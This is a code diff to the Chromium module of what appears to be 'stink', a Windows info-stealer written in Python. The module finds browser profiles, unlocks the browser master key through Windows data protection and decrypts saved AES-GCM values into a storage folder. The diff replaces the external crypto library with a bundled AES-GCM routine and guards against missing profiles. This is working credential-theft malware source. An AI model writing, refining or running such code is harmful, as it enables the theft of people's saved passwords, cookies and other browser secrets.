@@ -7,10 +7,9 @@ from datetime import datetime, timedelta
 from os import path, makedirs, remove, listdir
 from ctypes import windll, byref, cdll, c_buffer
 
-from Crypto.Cipher.AES import new, MODE_GCM
-
 from stink.helpers import DataBlob
 from stink.enums.features import Features
+from stink.utils import AESModeOfOperationGCM
 from stink.helpers.config import ChromiumConfig
 
 
@@ -23,6 +22,7 @@ class Chromium:
         self.__state_path = state_path
         self.__browser_path = browser_path
         self.__statuses = statuses
+        self.__profiles = None
         self.__errors = errors
 
         self.__config = ChromiumConfig()
@@ -42,7 +42,7 @@ class Chromium:
         if path.exists(self.__browser_path) and any(self.__statuses):
 
             makedirs(rf"{self.__storage_path}\Browsers\{self.__browser_name}")
-            self.profiles = self._get_profiles()
+            self.__profiles = self._get_profiles()
 
     @staticmethod
     def _crypt_unprotect_data(encrypted_bytes: b64decode, entropy=b''):
@@ -74,7 +74,7 @@ class Chromium:
     def _decrypt(value: bytes, master_key: bytes = None):
 
         try:
-            return new(master_key, MODE_GCM, value[3:15]).decrypt(value[15:])[:-16].decode()
+            return AESModeOfOperationGCM(master_key, value[3:15]).decrypt(value[15:])[:-16].decode()
         except:
             return "Can't decode"
 
@@ -224,7 +224,11 @@ class Chromium:
 
     def _check_functions(self):
 
-        for profile in self.profiles:
+        if not self.__profiles:
+            if self.__errors is True: print(f"[{self.__browser_name}]: No profiles found.")
+            return
+
+        for profile in self.__profiles:
 
             functions = self._get_browser_paths(profile)
 
